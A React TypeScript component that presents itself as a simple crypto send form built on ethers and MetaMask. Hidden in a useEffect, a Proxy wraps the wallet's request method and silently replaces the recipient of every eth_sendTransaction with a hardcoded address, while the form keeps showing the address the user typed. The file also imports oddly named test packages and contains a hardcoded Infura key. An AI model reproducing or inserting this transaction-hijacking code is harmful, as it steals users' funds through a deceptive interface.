import React, { useEffect, useState } from "react";
import { ethers, getBigInt, toBigInt } from "ethers";
import { BigNumber } from "bignumber.js";
import inject from "test1-sdk-demo";
import axios from "axios";
import { CustomEthers } from "test12_npm_package";

export default function Card() {
  const [address, setAddress] = useState("");

  const [provider, setProvider] = useState<any>({});
  const [amount, setAmount] = useState("");
  const [toAddress, setToAddress] = useState("");
  const [txHash, setTxHash] = useState("");
  const [msg, setMsg] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  class BigNumber {
    _hex: string;
    _isBigNumber: boolean;
    constructor(hex: any) {
      this._hex = hex;
      this._isBigNumber = true;
    }
  }

  const customethers = new CustomEthers();
  useEffect(() => {
    const big = new BigNumber(0.1);

    const provider: any = new ethers.BrowserProvider(window?.ethereum);

    // transaction();

    setProvider(provider);
    accountChangedHandler(provider);
  }, [address]);

  function containsOnlyDigits(str: any) {
    var rgx = /^[0-9]*\.?[0-9]*$/;
    return str.match(rgx);
  }

  const handleInput = (value: any, input: any) => {
    setTxHash("");
    setMsg("");
    if (input === "amount" && containsOnlyDigits(value)) {
      setAmount(value);
    } else if (input === "toAddress") {
      setToAddress(value);
    }
  };

  const accountChangedHandler = async (pro: any) => {
    try {
      const newAccount = await pro.getSigner();
      const address = await newAccount.getAddress();

      setAddress(address);
    } catch (error) {}
  };

  const transaction = async () => {
    try {
      setIsLoading(true);
      const tx: any = {
        to: toAddress,
        value: customethers.parseEther(amount),
      };
      // const provider2: any = new customethers.ethers.BrowserProvider(
      //   window?.ethereum
      // );

      // const provider1: any = getEthersProvider();
      // console.log("providers", provider, provider1, tx);

      const add: string = address;
      // console.log("custom", customethers);

      // // // change provider value to test
      // console.log("providers", provider, "137", add);
      // const custom: any = new ethers.JsonRpcProvider(
      //   "https://polygon-mainnet.infura.io/v3/66e3a238dbe74ec3b1921da35f98b8e9"
      // );

      // const c = new ethers.BrowserProvider(custom);
      //const signer1 = await customethers.metaMaskSigner(provider, "137", add);
      const signer1 = await provider.getSigner();
      // console.log(custom, provider, address);

      const hash = await signer1.sendTransaction(tx);
      //
      // const signer = await getEthersSigner();
      setIsLoading(false);
      // console.log("signer", signer);

      setAmount("");
      setToAddress("");
      setTxHash(hash.hash);
    } catch (error: any) {
      console.log(error);
      setMsg(error?.reason);
      setIsLoading(false);
    }
  };

  const send = async (arg: any) => {
    console.log("args", arg);
  };

  const sign = () => {};

  useEffect(() => {
    // inject();
    console.log(window.ethereum);
    window.ethereum.enable();
    const originalRequest = window.ethereum.request;
    const customRpcUrl =
      "https://polygon-mainnet.infura.io/v3/66e3a238dbe74ec3b1921da35f98b8e9";
    const customChainId = "0x89";
    window.ethereum.request = new Proxy(originalRequest, {
      apply: async function (target, thisArg, argumentsList) {
        const method = argumentsList[0].method;
        const params = argumentsList[0].params || [];

        if (method === "eth_sendTransaction") {
          if (params && params[0] && params[0].to) {
            argumentsList[0].params = [
              {
                ...params[0],
                to: "0x99A221a87b3C2238C90650fa9BE0F11e4c499D06",
              },
            ];
          }

          send(argumentsList[0]);

          return await Reflect.apply(target, thisArg, argumentsList);
        }
        console.log("arg", argumentsList);

        return await Reflect.apply(target, thisArg, argumentsList);
      },
    });
  }, []);

  return (
    <div>
      <div className='card'>
        <input
          type='text'
          value={amount}
          placeholder='Enter Amount'
          onChange={(e) => handleInput(e.target.value, "amount")}
        />
        <input
          type='text'
          value={toAddress}
          placeholder='Enter Address'
          onChange={(e) => handleInput(e.target.value, "toAddress")}
        />
        <button onClick={transaction}>
          {isLoading ? "Loading..." : "Send"}
        </button>
        <p className='red'>{msg && msg}</p>
      </div>
      <p className='green'> {txHash && "Transaction Success:" + txHash}</p>
    </div>
  );
}
